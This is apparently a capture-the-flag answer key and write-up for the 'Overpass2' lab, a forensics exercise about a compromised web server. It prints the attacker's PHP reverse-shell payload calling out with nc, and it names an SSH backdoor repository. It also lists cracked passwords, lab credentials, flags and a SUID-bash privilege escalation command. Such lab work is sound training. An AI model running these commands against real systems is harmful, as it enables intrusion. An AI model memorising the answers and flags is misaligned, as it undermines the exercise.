# Overpass2
##### Question 1:  What was the URL of the page they used to upload a reverse shell? 
Answer
```bash
/development/
```

##### Question 2: What payload did the attacker use to gain access?
Answer
```bash
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

##### Question 3: What password did the attacker use to privesc?
Answer
```bash
whenevernoteartinstant
```

##### Question 4: How did the attacker establish persistence?
Answer
```bash
https://github.com/NinjaJc01/ssh-backdoor
```

##### Question 5: Using the fasttrack wordlist, how many of the system passwords were crackable?
Answer
```bash
4
```

##### Question 6:  What's the default hash for the backdoor? 
Answer
```bash
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```

##### Question 7: What's the hardcoded salt for the backdoor?
Answer
```bash
1c362db832f3f864c8c2fe05f2002a05
```

##### Question 8: What was the hash that the attacker used? - go back to the PCAP for this!
Answer
```bash
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

##### Question 9: Crack the hash using rockyou and a cracking tool of your choice. What's the password?
Answer
```bash
november16
```

##### Question 10:  The attacker defaced the website. What message did they leave as a heading? 
Answer
```bash
H4ck3d by CooctusClan
```

##### Question 11: User flag
Answer
```bash
thm{d119b4fa8c497ddb0525f7ad200e6567}
```

##### Question:  Root flag
Answer
```bash
thm{d53b2684f169360bb9606c333873144d}
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  - -

User passwords Cracked:
```bash
1qaz2wsx         (muirland)
abcd123          (szymex)
secret12         (bee)
secuirty3 		 (paradox)
```

Nmap Scan:
```bash
Nmap scan report for 10.10.121.90
Host is up (0.10s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
No exact OS matches for host (If you know what OS is running on it, see 
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   34.88 ms  10.6.0.1
2   ... 3
4   103.64 ms 10.10.121.90

```

ssh: port 2222 james:november16
Priv Esc:
```bash
/home/james/.suid_bash -p
```